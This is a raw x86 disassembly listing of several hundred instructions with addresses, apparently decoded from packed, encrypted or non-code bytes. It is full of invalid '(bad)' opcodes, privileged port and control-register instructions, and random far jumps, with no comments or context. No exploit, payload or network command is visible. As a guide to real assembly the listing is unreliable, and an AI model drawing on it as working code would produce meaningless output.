  4205b1:	inc    ebx
  4205b2:	lods   al,BYTE PTR ds:[esi]
  4205b3:	mov    ds:0xd1a81ee5,al
  4205b8:	sbb    DWORD PTR [ecx],0x56ec7fd3
  4205be:	and    BYTE PTR [ebx+0x1aba4473],ah
  4205c4:	sahf   
  4205c5:	jne    0x420556
  4205c7:	aam    0xfb
  4205c9:	jle    0x420618
  4205cb:	mov    esp,ebp
  4205cd:	lods   eax,DWORD PTR ds:[esi]
  4205ce:	cmc    
  4205cf:	adc    al,0xc
  4205d1:	out    0xd1,eax
  4205d3:	fld    DWORD PTR [edi]
  4205d5:	push   ebp
  4205d6:	xchg   esi,eax
  4205d7:	ror    dl,0x0
  4205da:	int    0xb
  4205dc:	dec    edi
  4205dd:	and    ah,ch
  4205df:	fwait
  4205e0:	fs dec edi
  4205e2:	inc    edx
  4205e3:	cdq    
  4205e4:	daa    
  4205e5:	add    ch,bl
  4205e7:	fstp   DWORD PTR [ebp-0x51]
  4205ea:	mov    BYTE PTR [esi],bh
  4205ec:	scas   eax,DWORD PTR es:[edi]
  4205ed:	add    DWORD PTR [ebx-0x28],edx
  4205f0:	add    eax,0x1a5c090e
  4205f5:	jmp    0xdab0:0x9a256c5d
  4205fc:	sti    
  4205fd:	std    
  4205fe:	retf   
  4205ff:	inc    ebx
  420600:	(bad)  
  420602:	std    
  420603:	inc    edx
  420604:	mov    eax,ds:0x53004a42
  420609:	es out dx,al
  42060b:	xor    ebp,esp
  42060d:	jae    0x420603
  42060f:	pushf  
  420610:	xor    eax,0x22368a8
  420615:	out    dx,eax
  420616:	xchg   esp,eax
  420617:	sbb    BYTE PTR ds:0xf6ea965e,bl
  42061d:	retf   
  42061e:	mov    edx,0x1b900564
  420623:	pop    es
  420624:	adc    ah,cl
  420626:	xchg   edi,eax
  420627:	ficom  DWORD PTR [ebx]
  420629:	ret    
  42062a:	dec    esp
  42062b:	xchg   edi,eax
  42062c:	aaa    
  42062d:	cmp    cl,BYTE PTR [eax]
  42062f:	scas   eax,DWORD PTR es:[edi]
  420630:	imul   edx,DWORD PTR ds:0x5221a46a,0x34fc8bb3
  42063a:	or     DWORD PTR [eax+0x7bf53097],0xfffffffc
  420641:	adc    dl,BYTE PTR [eax-0x16]
  420644:	cli    
  420645:	sub    esp,DWORD PTR [edi+0x24]
  420648:	push   edx
  420649:	pop    esp
  42064a:	ret    
  42064b:	jbe    0x4205d0
  42064d:	push   es
  42064e:	and    al,0x95
  420650:	jg     0x42066f
  420652:	jne    0x420695
  420654:	mov    bh,BYTE PTR [esi-0x38059b29]
  42065a:	push   DWORD PTR [ecx]
  42065c:	or     al,0x3b
  42065e:	mov    ebp,0x31ec73a0
  420663:	mov    dl,BYTE PTR [edx]
  420665:	gs jg  0x4205ff
  420668:	out    0x88,al
  42066a:	dec    eax
  42066b:	fdivr  QWORD PTR [ebp+eax*8+0x385f8252]
  420672:	shl    DWORD PTR [edi+esi*2],0x7c
  420676:	sub    cl,bl
  420678:	cmp    eax,0x328186c0
  42067d:	lods   al,BYTE PTR ds:[esi]
  42067e:	enter  0xa94c,0xbe
  420682:	xchg   ebx,eax
  420683:	push   edi
  420684:	mov    cr3,ecx
  420687:	repz (bad) 
  420689:	sub    eax,0xaf2f7710
  42068e:	sbb    BYTE PTR [ebx-0x7184ff93],dl
  420694:	or     BYTE PTR [ebp+0x64dd466],cl
  42069a:	loop   0x42067a
  42069c:	add    BYTE PTR [esi-0x6d],ah
  42069f:	rol    DWORD PTR [edi-0x14],1
  4206a2:	retf   
  4206a3:	je     0x42070a
  4206a5:	ds cmc 
  4206a7:	fcom   QWORD PTR [eax+edx*4]
  4206aa:	sbb    eax,0x7bf5126f
  4206af:	arpl   sp,si
  4206b1:	fist   WORD PTR [eax+ebp*4+0x135301c9]
  4206b8:	jge    0x4206fe
  4206ba:	xchg   esi,eax
  4206bb:	pop    edx
  4206bc:	xor    DWORD PTR [eax-0x7c],0xffffffb7
  4206c0:	cld    
  4206c1:	outs   dx,DWORD PTR ds:[esi]
  4206c2:	loope  0x420663
  4206c4:	call   0x355e:0x7ddb1c8b
  4206cb:	les    ebx,FWORD PTR [ebp+0x259832d7]
  4206d1:	jg     0x420658
  4206d3:	mov    al,ds:0xf4aa8a4
  4206d8:	stos   BYTE PTR es:[edi],al
  4206d9:	cmp    eax,esp
  4206db:	jmp    0x4206ac
  4206dd:	cs dec eax
  4206df:	ja     0x420678
  4206e1:	ret    
  4206e2:	jmp    0x4206b9
  4206e4:	test   eax,0x873a66c2
  4206e9:	dec    esp
  4206ea:	es pop ds
  4206ec:	mov    dh,0x2
  4206ee:	mov    cl,0x5f
  4206f0:	in     al,0xc1
  4206f2:	push   ebp
  4206f3:	lock (bad) 
  4206f5:	adc    BYTE PTR [esi-0x58],al
  4206f8:	mov    edi,0x16048ed9
  4206fd:	push   eax
  4206fe:	mov    bl,0x5d
  420700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420701:	xchg   esp,eax
  420702:	and    BYTE PTR [edi+0x52],dl
  420705:	in     eax,dx
  420706:	test   BYTE PTR [esi+0x3d],bl
  420709:	gs jnp 0x4206a7
  42070c:	arpl   WORD PTR [edi-0x4b],dx
  42070f:	ss mov ebx,0x3653915e
  420715:	jge    0x4206d9
  420717:	mov    edx,0x2266fc16
  42071c:	mov    ah,0x24
  42071e:	sbb    eax,0x8a761fdb
  420723:	fbld   TBYTE PTR [ebx-0x37]
  420726:	jecxz  0x4206ba
  420728:	xchg   ecx,eax
  420729:	retf   0xa931
  42072c:	(bad)  
  42072d:	cld    
  42072e:	lods   al,BYTE PTR ds:[esi]
  42072f:	(bad)  
  420730:	mov    ebp,0xaf6316c3
  420735:	push   0x7e
  420737:	dec    ebx
  420738:	or     BYTE PTR [esi-0x3d5a7c89],dl
  42073e:	js     0x420737
  420740:	fsub   QWORD PTR [edi-0x5e0f5cb9]
  420746:	jp     0x4206d0
  420748:	retw   0xac2c
  42074c:	xor    eax,0x2a6adcc9
  420751:	push   cs
  420752:	xchg   esp,eax
  420753:	pop    edi
  420754:	or     eax,0x6726eb2f
  420759:	cmp    BYTE PTR [ebx],dh
  42075b:	push   0xffffffb1
  42075d:	cmp    esp,0xfffffff0
  420760:	scas   al,BYTE PTR es:[edi]
  420761:	shr    DWORD PTR [ebx+0x75],cl
  420764:	xchg   ebx,eax
  420765:	adc    bl,ah
  420767:	jmp    0x6647495d
  42076c:	add    ebp,edi
  42076e:	pop    edi
  42076f:	ja     0x420745
  420771:	and    eax,0xc8dfecd3
  420776:	push   cs
  420777:	ins    DWORD PTR es:[edi],dx
  420778:	and    al,0xc5
  42077a:	retf   0x1082
  42077d:	mov    eax,ds:0x54f13938
  420782:	fidivr WORD PTR [eax]
  420784:	push   cs
  420785:	jo     0x420794
  420787:	clc    
  420788:	push   0x8
  42078a:	dec    eax
  42078b:	bound  esi,QWORD PTR [ecx+0x26]
  42078e:	mov    eax,0xa2bed06f
  420793:	cmp    edi,DWORD PTR [ebp+0x10]
  420796:	jmp    0xa5cf:0x3e4734e9
  42079d:	sbb    eax,0x6b358e11
  4207a2:	dec    edi
  4207a3:	scas   al,BYTE PTR es:[edi]
  4207a4:	push   eax
  4207a5:	bound  esp,QWORD PTR [edx+0x77e8a376]
  4207ab:	popf   
  4207ac:	and    DWORD PTR [ebx+0x6380b3bd],edx
  4207b2:	std    
  4207b3:	dec    ecx
  4207b4:	sub    al,0xc8
  4207b6:	loop   0x4207f6
  4207b8:	sbb    DWORD PTR [esi+edi*2+0xc949d9],0x1
  4207c0:	stos   BYTE PTR es:[edi],al
  4207c1:	jbe    0x420795
  4207c3:	mov    ds:0x5505f138,eax
  4207c8:	mov    ah,0x1f
  4207ca:	sbb    DWORD PTR [eax],ecx
  4207cc:	ja     0x420782
  4207ce:	sub    edi,esp
  4207d0:	fsub   QWORD PTR [eax-0x5018790]
  4207d6:	sbb    ebp,ebx
  4207d8:	inc    esp
  4207d9:	sub    DWORD PTR [ecx+ebx*2-0x55],ebp
  4207dd:	push   0x253ef43b
  4207e2:	add    dl,BYTE PTR ds:0xa22e0d54
  4207e9:	test   eax,0x6f0817cd
  4207ee:	cmp    edi,edi
  4207f0:	xchg   edx,eax
  4207f1:	shl    DWORD PTR [ebp-0x46a7bd10],1
  4207f7:	jmp    0x42079c
  4207f9:	jns    0x420784
  4207fb:	test   eax,0x6929c7d4
  420801:	fnstenv [edx]
  420803:	mov    ebp,0xa85cc12
  420808:	(bad)  
  420809:	xchg   esi,eax
  42080a:	pop    ebx
  42080b:	mov    al,dl
  42080d:	lahf   
  42080e:	cwde   
  42080f:	fs scas eax,DWORD PTR es:[edi]
  420811:	mov    ebx,0xa2b5ee25
  420816:	jmp    0x4207fd
  420818:	popf   
  420819:	fstp   QWORD PTR [ebx]
  42081b:	(bad)  
  42081c:	xchg   esp,eax
  42081d:	add    DWORD PTR [eax],esp
  42081f:	mov    ecx,0x1a14dcd7
  420824:	jmp    0x6f6fafe2
  420829:	adc    BYTE PTR [edx],0x27
  42082c:	or     dl,cl
  42082e:	test   BYTE PTR [edx+0x2cc59af0],dh
  420834:	imul   esi,eax,0x543b6f64
  42083a:	xor    al,0xfa
  42083c:	pop    esi
  42083d:	loop   0x4207df
  42083f:	push   ss
  420840:	in     al,0x39
  420842:	xchg   edi,eax
  420843:	mov    ds:0x8277c0ab,al
  420848:	inc    esp
  420849:	fisubr WORD PTR [ebp-0x6f3c91af]
  42084f:	fist   WORD PTR ds:0xe1b52163
  420855:	scas   al,BYTE PTR es:[edi]
  420856:	xchg   BYTE PTR [esi],dl
  420858:	and    BYTE PTR [esi+0x35],bl
  42085b:	sub    DWORD PTR [eax+0x2d],edi
  42085e:	push   0x40f92ae0
  420863:	cld    
  420864:	fsubrp st(5),st
  420866:	sbb    BYTE PTR [esi+0x508b760c],bl
  42086c:	cmp    DWORD PTR [edi+0xf80b876],edi
  420872:	pop    esi
  420873:	out    dx,al
  420874:	add    eax,0xdf9b06e8
  420879:	adc    DWORD PTR [esi+eax*8],edi
  42087c:	loopne 0x420817
  42087e:	vaddsubpd xmm4,xmm1,XMMWORD PTR [edi+0x790cbead]
  420886:	pop    ebx
  420887:	mov    al,0xb5
  420889:	adc    esi,esp
  42088b:	out    dx,al
  42088c:	and    eax,0x7804c64
  420891:	outs   dx,BYTE PTR ds:[esi]
  420892:	test   BYTE PTR [ecx-0x6a],ah
  420895:	retf   
  420896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420897:	aas    
  420898:	jp     0x4208e2
  42089a:	faddp  st(4),st
  42089c:	jo     0x4208c1
  42089e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42089f:	push   esi
  4208a0:	lods   eax,DWORD PTR ds:[esi]
  4208a1:	stc    
  4208a2:	cs push esi
  4208a4:	xor    DWORD PTR [eax-0x2f],edi
  4208a7:	jbe    0x42090a
  4208a9:	xchg   edx,eax
  4208aa:	in     eax,0xd1
  4208ac:	mov    ?,WORD PTR [eax+ebp*2]
  4208af:	push   esi
  4208b0:	mov    bl,0xc5
  4208b2:	pop    ebp
  4208b3:	push   eax
  4208b4:	int    0x98
  4208b6:	mov    edi,0x6c6a6eb
  4208bb:	(bad)  
  4208bc:	imul   ecx,esp,0xfffffffe
  4208bf:	xchg   DWORD PTR [edx],esp
  4208c1:	mov    dh,0xe1
  4208c3:	rcl    BYTE PTR [ecx-0x153a7ad7],1
  4208c9:	loope  0x420884
  4208cb:	pop    ds
  4208cc:	dec    edi
  4208cd:	mov    eax,0x24075857
  4208d2:	xor    al,0xa9
  4208d4:	ret    0xca80
  4208d7:	nop
  4208d8:	mov    BYTE PTR [ebx-0x28],dh
  4208db:	adc    al,BYTE PTR [ebp+0x7c]
  4208de:	sbb    cl,BYTE PTR ds:0xddbf9e2d
  4208e4:	mov    ds:0xf1ca888d,al
  4208e9:	hlt    
  4208ea:	push   0xfffffffc
  4208ec:	dec    ecx
  4208ed:	jb     0x420932
  4208ef:	ja     0x4208cb
  4208f1:	lea    esi,ds:0xef7a0b66
  4208f7:	cmp    al,0x3
  4208f9:	push   ecx
  4208fa:	into   
  4208fb:	lods   al,BYTE PTR ds:[esi]
  4208fc:	in     al,0xb2
  4208fe:	int    0x3d
  420900:	fdiv   QWORD PTR [edi+0x19352525]
  420906:	inc    ecx
  420907:	push   es
  420908:	mov    ah,0xce
  42090a:	dec    eax
  42090b:	mov    esp,DWORD PTR [ebx]
  42090d:	ror    edi,cl
  42090f:	test   eax,0xea71b00e
  420914:	or     al,0x4f
  420916:	xchg   esp,eax
  420917:	in     eax,0x23
  420919:	ja     0x420959
  42091b:	test   al,0xea
  42091d:	push   edi
  42091e:	jge    0x42091a
  420920:	sti    
  420921:	daa    
  420922:	ins    DWORD PTR es:[edi],dx
  420923:	test   BYTE PTR [ecx],cl
  420925:	pop    ebx
  420926:	xor    cl,dl
  420928:	(bad)  
  420929:	out    0xe3,al
  42092b:	lea    edi,[eax+ebp*8]
  42092e:	and    BYTE PTR [ecx+ecx*8],ah
  420931:	je     0x42094d
  420933:	mov    esi,0x9e68ca53
  420938:	cmp    bl,ch
  42093a:	mov    al,0x52
  42093c:	sbb    eax,DWORD PTR [eax]
  42093e:	ins    DWORD PTR es:[edi],dx
  42093f:	xor    ch,ah
  420941:	(bad)  
  420942:	push   ds
  420943:	repnz lods eax,DWORD PTR ds:[esi]
  420945:	or     eax,0xa955e981
  42094a:	rol    cl,1
  42094c:	sbb    esp,ecx
  42094e:	push   eax
  42094f:	mov    dh,0xd8
  420951:	inc    esi
  420952:	xchg   ebx,eax
  420953:	mov    bl,0xc5
  420955:	and    bl,al
  420957:	jns    0x4208e2
  420959:	mov    bl,0xac
  42095b:	popf   
  42095c:	out    0x9e,eax
  42095e:	arpl   WORD PTR [eax-0x34],sp
  420961:	inc    esp
  420962:	sti    
  420963:	add    DWORD PTR ds:0xcfdc6a5f,ebx
  420969:	mov    edx,0x1d1ac5e4
  42096e:	sbb    al,0x3c
  420970:	add    bh,BYTE PTR [esi-0x50b26737]
  420976:	jae    0x42093c
  420978:	lods   al,BYTE PTR ds:[esi]
  420979:	pop    ss
  42097a:	fild   DWORD PTR [esp+edi*1]
  42097d:	dec    ebx
  42097e:	mov    DWORD PTR [eax+0x71],0x437db835
  420985:	mov    BYTE PTR [ecx-0x7d0fe806],bl
  42098b:	mov    edx,0x4570da71
  420990:	sub    BYTE PTR [eax+0xd],dl
  420993:	mov    esp,0x91929838
  420998:	cmp    al,0x60
  42099a:	adc    eax,0xe9da5009
  42099f:	test   BYTE PTR [ebx],bh
  4209a1:	mov    dh,0x39
  4209a3:	jae    0x4209b0
  4209a5:	loope  0x420a16
  4209a7:	fist   DWORD PTR [ecx-0x5b]
  4209aa:	das    
  4209ab:	mov    WORD PTR [ecx+ebx*4-0x3456513],?
  4209b2:	repnz pop ecx
  4209b4:	inc    esp
  4209b5:	es cmp ch,0x6f
  4209b9:	dec    ebx
  4209ba:	in     al,dx
  4209bb:	mov    al,0x6e
  4209bd:	fwait
  4209be:	jmp    0x292c:0xa38476e9
  4209c5:	mov    al,0x1b
  4209c7:	cmc    
  4209c8:	add    eax,0xfeefa06b
  4209cd:	xor    al,0xad
  4209cf:	mov    al,al
  4209d1:	je     0x420975
  4209d3:	test   BYTE PTR [ebx],ah
  4209d5:	jg     0x420a36
  4209d7:	jmp    0x42098b
  4209d9:	test   ebp,esp
  4209db:	retf   
  4209dc:	or     BYTE PTR [ebp+eax*1-0x1621b5d],bh
  4209e3:	xor    DWORD PTR [ecx+0x2d],edx
  4209e6:	pop    ds
  4209e7:	sbb    eax,0x8a56c4fd
  4209ec:	and    al,cl
  4209ee:	xchg   esp,eax
  4209ef:	fwait
  4209f0:	push   DWORD PTR ds:[eax]
  4209f3:	cli    
  4209f4:	inc    eax
  4209f5:	shl    DWORD PTR [edi+0x78e6c062],1
  4209fb:	stc    
  4209fc:	pop    eax
  4209fd:	rol    BYTE PTR [edx],1
  4209ff:	jno    0x4209ed
  420a01:	push   ss
  420a02:	cdq    
  420a03:	je     0x4209f0
  420a05:	popa   
  420a06:	sbb    eax,0xd96a1351
  420a0b:	sub    dl,BYTE PTR [eax-0x6fe2bd73]
  420a11:	mov    esi,0x9df55a6b
  420a16:	fdivr  st,st(6)
  420a18:	and    al,0xdd
  420a1a:	fcom   QWORD PTR [ebx+0x18f99363]
  420a20:	sbb    DWORD PTR [edx-0x2a676ea6],ebx
  420a26:	test   bl,dl
  420a28:	xchg   edx,eax
  420a29:	mov    ds:0x7fdea3cd,eax
  420a2e:	sub    al,0x6d
  420a30:	or     edi,DWORD PTR [esi+0x70]
  420a33:	lods   al,BYTE PTR ds:[esi]
  420a34:	jmp    0x420a2f
  420a36:	sbb    eax,0x43095335
  420a3b:	in     eax,0x30
  420a3d:	out    dx,eax
  420a3e:	sbb    BYTE PTR [esi-0x46],al
  420a41:	mov    dh,0xe9
  420a43:	adc    ebx,DWORD PTR [ebp-0x43e071f8]
  420a49:	xchg   esi,eax
  420a4a:	jle    0x420aaa
  420a4c:	pop    ss
  420a4d:	xor    edi,DWORD PTR [edi]
  420a4f:	mov    ?,WORD PTR [esi-0x5e]
  420a52:	mov    ah,0x6f
  420a54:	push   ecx
  420a55:	sahf   
  420a56:	and    BYTE PTR [eax+ebx*4-0x6183d09e],cl
  420a5d:	inc    esp
  420a5e:	or     dh,cl
  420a60:	(bad)  [esi+0x30]
  420a63:	shl    BYTE PTR [ebx-0x5842a59b],cl
  420a69:	outs   dx,BYTE PTR ds:[esi]
  420a6a:	in     eax,dx
  420a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a6c:	je     0x420a7c
  420a6e:	pusha  
  420a6f:	inc    edx
  420a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a71:	pop    es
  420a72:	iret   
  420a73:	repnz add ecx,DWORD PTR [ebx+0x30a451df]
  420a7a:	push   es
  420a7b:	fadd   QWORD PTR [eax+edx*2+0x17d837b]
  420a82:	pop    ds
  420a83:	(bad)  
  420a84:	retf   
  420a85:	jns    0x420b02
  420a87:	inc    edx
  420a88:	inc    esi
  420a89:	call   0x5645563c
  420a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8f:	cmp    eax,0x69fe726c
  420a94:	cld    
  420a95:	ret    
  420a96:	shr    BYTE PTR [eax+0x14],0x96
  420a9a:	push   esp
  420a9b:	mov    WORD PTR [ebx-0x15],?
  420a9e:	sbb    DWORD PTR [ecx+eiz*4-0x6c],0x8909d411
  420aa6:	iret   
  420aa7:	lock imul ebx,DWORD PTR [eax+0x1e],0xffffff88
  420aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aad:	inc    ecx
  420aae:	inc    edi
  420aaf:	ja     0x420a78
  420ab1:	sbb    eax,0xec879e51
  420ab6:	or     al,0xab
  420ab8:	xchg   ebp,eax
  420ab9:	jle    0x420b24
  420abb:	jo     0x420a5b
  420abd:	(bad)  
  420abe:	shr    DWORD PTR [eax],cl
  420ac0:	clc    
  420ac1:	dec    edi
  420ac2:	and    DWORD PTR [ebx],eax
  420ac4:	jno    0x420a88
  420ac6:	jmp    0x420b30
  420ac8:	jg     0x420a75
  420aca:	xor    BYTE PTR ds:0x2a923972,ah
  420ad0:	adc    BYTE PTR [edi-0x710841ef],cl
  420ad6:	cli    
  420ad7:	ins    DWORD PTR es:[edi],dx
  420ad8:	jns    0x420b02
  420ada:	sub    al,BYTE PTR [esi-0x18b4ab95]
  420ae0:	pop    esp
  420ae1:	add    BYTE PTR [ecx-0x3fe5b1c9],ah
  420ae7:	lea    esi,[esi+0x8]
  420aea:	jbe    0x420a97
  420aec:	push   ecx
  420aed:	mov    DWORD PTR [edi+0x7edc4caf],esp
  420af3:	inc    edi
  420af4:	inc    eax
  420af5:	jae    0x420ad2
  420af7:	push   0xe
  420af9:	sahf   
  420afa:	test   DWORD PTR [esi],esp
  420afc:	push   ebp
  420afd:	stos   DWORD PTR es:[edi],eax
  420afe:	sbb    DWORD PTR [ecx-0xf],eax
  420b01:	les    esp,FWORD PTR [edx+ebx*8]
  420b04:	nop
  420b05:	loop   0x420b53
  420b07:	jo     0x420abc
  420b09:	and    eax,0x8c0e8bc
  420b0e:	mov    ecx,0xf36d1398
  420b13:	jmp    0x3a23d5f7
  420b18:	fcmovu st,st(0)
  420b1a:	cmp    ah,dl
  420b1c:	xor    al,BYTE PTR [edi]
  420b1e:	data16 das 
  420b20:	test   eax,0xd6fd4828
  420b25:	inc    ebp
  420b26:	stc    
  420b27:	ficom  WORD PTR [esi-0x5]
  420b2a:	pop    ss
  420b2b:	inc    ebp
  420b2c:	xor    eax,0xfe45d81e
  420b31:	lea    edx,[eax-0x7b]
  420b34:	dec    edx
  420b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b36:	inc    eax
  420b37:	fucomip st,st(1)
  420b39:	call   0x6366:0x5a5d14cd
  420b40:	mov    esi,0x386e5528
  420b45:	inc    ebp
  420b46:	push   es
  420b47:	fistp  QWORD PTR [ebx+eax*2]
  420b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b4b:	in     al,0x74
  420b4d:	jg     0x420af3
  420b4f:	and    eax,0xa156c998
  420b54:	cmp    BYTE PTR [ebx-0x55abb05d],cl
  420b5a:	rcr    DWORD PTR [eax],0xac
  420b5d:	jecxz  0x420ba0
  420b5f:	out    dx,eax
  420b60:	clc    
  420b61:	mov    esp,0xed9fcef2
  420b66:	cs leave 
  420b68:	ret    
  420b69:	call   0xa9bc141b
  420b6e:	std    
  420b6f:	pusha  
  420b70:	enter  0x2c99,0xd8
  420b74:	int    0x45
  420b76:	retf   0x2734
  420b79:	fidivr DWORD PTR [esi+0xc]
  420b7c:	mov    ds,eax
  420b7e:	stc    
  420b7f:	add    esp,DWORD PTR [esp+ebp*1-0x66]
  420b83:	inc    ecx
  420b84:	(bad)
  420b88:	sbb    eax,0x374246
  420b8d:	popa   
  420b8e:	mov    bh,0xb2
  420b90:	or     DWORD PTR [eax-0x24],ecx
  420b93:	push   ebx
  420b94:	jmp    0x420b74
  420b96:	cmp    bl,bl
  420b98:	gs jnp 0x420bbe
  420b9b:	into   
  420b9c:	inc    edx
  420b9d:	hlt    
  420b9e:	add    eax,0xf2282369
  420ba3:	imul   ecx,esi,0x9203f634
  420ba9:	popf   
  420baa:	add    ebp,esi
  420bac:	(bad)  
  420bad:	pusha  
  420bae:	mov    dh,0x38
  420bb0:	mov    edi,0x8af53228
  420bb5:	mov    ax,WORD PTR [ebx+ecx*4+0x3f8be3a2]
  420bbd:	sar    bh,0x46
  420bc0:	jbe    0x420b81
  420bc2:	or     eax,0xcefc25a4
  420bc7:	out    0x43,eax
  420bc9:	cmp    DWORD PTR [eax],edx
  420bcb:	jmp    0xbbd13be
  420bd0:	out    0xe6,al
  420bd2:	(bad)  
  420bd3:	push   ecx
  420bd4:	cmp    ah,ah
  420bd6:	lahf   
  420bd7:	adc    esp,esi
  420bd9:	sbb    dl,BYTE PTR [esi]
  420bdb:	mov    ebp,0xe38f116d
  420be0:	xchg   edx,eax
  420be1:	cmp    edi,ebp
  420be3:	loope  0x420bb5
  420be5:	inc    ebx
  420be6:	push   edi
  420be7:	jle    0x420b8a
  420be9:	mov    bl,BYTE PTR [edi-0xd]
  420bec:	data16 clc 
  420bee:	jae    0x420b92
  420bf0:	sbb    bl,cl
  420bf2:	imul   edx,DWORD PTR cs:[edx-0x59],0xffffffab
  420bf7:	dec    esi
  420bf8:	leave  
  420bf9:	and    dh,dh
  420bfb:	mov    dl,0x5c
  420bfd:	add    edi,DWORD PTR [ebp-0x6d]
  420c00:	push   ecx
  420c01:	jecxz  0x420c39
  420c03:	inc    ebp
  420c04:	mov    ecx,0xa65300a6
  420c09:	and    DWORD PTR [edi],ecx
  420c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0c:	(bad)  
  420c0d:	jge    0x420c28
  420c0f:	arpl   WORD PTR ds:0xff5c29b8,si
  420c15:	push   ecx
  420c16:	es gs ins BYTE PTR es:[edi],dx
  420c19:	pop    es
  420c1a:	cwde   
  420c1b:	popa   
  420c1c:	int    0x71
  420c1e:	add    DWORD PTR [esi-0xa],eax
  420c21:	scas   eax,DWORD PTR es:[edi]
  420c22:	mov    esi,0x2e94dec0
  420c27:	fstp   DWORD PTR [edx+0xe150214]
  420c2d:	jmp    0x420bdb
  420c2f:	aas    
  420c30:	jo     0x420c53
  420c32:	push   0x549aaec
  420c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c38:	push   es
  420c39:	xor    dl,BYTE PTR [ebx]
  420c3b:	dec    edx
  420c3c:	jmp    0x27b3:0x1b1f9717
  420c43:	jle    0x420c57
  420c45:	cmc    
  420c46:	mov    edi,0x8d8ce8d4
  420c4b:	test   eax,0xa852ce9e
  420c50:	mov    ebx,0xe5b02ac5
  420c55:	dec    ebx
  420c56:	inc    esp
  420c57:	in     eax,dx
  420c58:	lock jg 0x420c1a
  420c5b:	sub    al,0x4d
  420c5d:	jge    0x420ccf
  420c5f:	in     eax,dx
  420c60:	je     0x420cc0
  420c62:	lods   eax,DWORD PTR ds:[esi]
  420c63:	ror    DWORD PTR ds:0x51264d18,0xf4
  420c6a:	add    esi,DWORD PTR fs:[ebp-0x50]
  420c6e:	sub    DWORD PTR [ecx+0x59],edx
  420c71:	jmp    0x420c01
  420c73:	data16 sub al,0xaf
  420c76:	not    DWORD PTR ss:[edi]
  420c79:	mov    DWORD PTR [edx+0x15],0x7763daec
  420c80:	sbb    dl,dl
  420c82:	xor    al,0xbf
  420c84:	fiadd  DWORD PTR [edi+0x1a14e1dc]
  420c8a:	xlat   BYTE PTR ds:[ebx]
  420c8b:	sub    edi,DWORD PTR [edx+edi*8+0x6961e398]
  420c92:	test   eax,0x375e911f
  420c97:	jno    0x420c91
  420c99:	in     eax,dx
  420c9a:	ins    BYTE PTR es:[edi],dx
  420c9b:	(bad)  
  420c9c:	cmp    BYTE PTR [edx],al
  420c9e:	mov    ds:0x46fca8b6,eax
  420ca3:	sub    al,0x5c
  420ca5:	ins    DWORD PTR es:[edi],dx
  420ca6:	cmc    
  420ca7:	call   0x9029:0x1489fe73
  420cae:	jb     0x420ca4
  420cb0:	shl    BYTE PTR [ebp-0x26],cl
  420cb3:	cmp    ah,BYTE PTR [ecx]
  420cb5:	retf   0x1eef
  420cb8:	hlt    
  420cb9:	cmp    BYTE PTR [eax-0x210e3d16],bl
  420cbf:	dec    esp
  420cc0:	and    eax,0x45f2a163
  420cc5:	or     al,0x13
  420cc7:	add    DWORD PTR [ecx-0x43c8b939],esi
  420ccd:	clc    
  420cce:	sub    al,0xe2
  420cd0:	jle    0x420ccd
  420cd2:	lahf   
  420cd3:	ret    
  420cd4:	and    DWORD PTR [eax+0x6ef7bce4],esi
  420cda:	pop    edx
  420cdb:	std    
  420cdc:	bound  ecx,QWORD PTR [eax+ecx*4+0x28]
  420ce0:	in     eax,dx
  420ce1:	mov    cl,0x30
  420ce3:	sar    DWORD PTR ds:0x66d1fd18,1
  420ce9:	mov    ecx,0x948a26e2
  420cee:	jb     0x420cfd
  420cf0:	test   DWORD PTR [edx],edi
  420cf2:	pop    eax
  420cf3:	xchg   edx,eax
  420cf4:	jle    0x420d03
  420cf6:	or     esp,DWORD PTR [eax]
  420cf8:	aad    0xcd
  420cfa:	idiv   DWORD PTR [edx]
  420cfc:	xor    DWORD PTR ds:0x9c6954c3,ebp
  420d02:	mov    ebx,0x5d109647
  420d07:	sar    ecx,1
  420d09:	xchg   ebp,eax
  420d0a:	xchg   ebx,eax
  420d0b:	dec    ebp
  420d0c:	mov    ebp,0xf2f0c8a4
  420d11:	cmc    
  420d12:	cmp    DWORD PTR es:[ebp-0x47],edi
  420d16:	push   eax
  420d17:	sub    al,cl
  420d19:	retf   0x2076
  420d1c:	cmp    al,0xcd
  420d1e:	mov    ch,0xfe
  420d20:	mov    al,dl
  420d22:	pop    ds
  420d23:	arpl   WORD PTR [ebx+0x1b02d9c6],di
  420d29:	pop    edx
  420d2a:	clc    
  420d2b:	push   esi
  420d2c:	and    eax,0xab0c16da
  420d31:	in     eax,dx
  420d32:	sbb    eax,0xc7f18f08
  420d37:	xchg   ebp,eax
  420d38:	and    eax,DWORD PTR [edx-0x3d44f462]
  420d3e:	stos   BYTE PTR es:[edi],al
  420d3f:	jmp    0x216d:0x27780e06
  420d46:	and    al,0x1e
  420d48:	(bad)
  420d4c:	inc    ecx
  420d4d:	mov    ds:0xa09d3bae,eax
  420d52:	sti    
  420d53:	out    0xa7,al
  420d55:	mov    dh,0x8
  420d57:	neg    DWORD PTR [eax-0x4b54cc2b]
  420d5d:	dec    ebx
  420d5e:	outs   dx,BYTE PTR ds:[esi]
  420d5f:	or     DWORD PTR [esi+0x49],esp
  420d62:	jp     0x420d47
  420d64:	mov    ah,0xbc
  420d66:	iret   
  420d67:	pushf  
  420d68:	std    
  420d69:	mov    esi,0xaf8fc433
  420d6e:	inc    esp
  420d6f:	xchg   DWORD PTR [edi+0x783a590f],edi
  420d75:	lea    ebp,[edi-0x42314d4b]
  420d7b:	mov    ebx,0xed8e85e4
  420d80:	inc    eax
  420d81:	sub    BYTE PTR [esi+0x1c],al
  420d84:	cmp    DWORD PTR [edx-0x773860b0],0x60
  420d8b:	jnp    0x420d62
  420d8d:	cld    
  420d8e:	(bad)  
  420d8f:	jne    0x420e04
  420d91:	xchg   esi,eax
  420d92:	aam    0xa3
  420d94:	retf   0x3bbe
  420d97:	jmp    0x1b4f:0xbf6b65de
  420d9e:	jbe    0x420d3e
  420da0:	imul   edx,esp,0x68708c8f
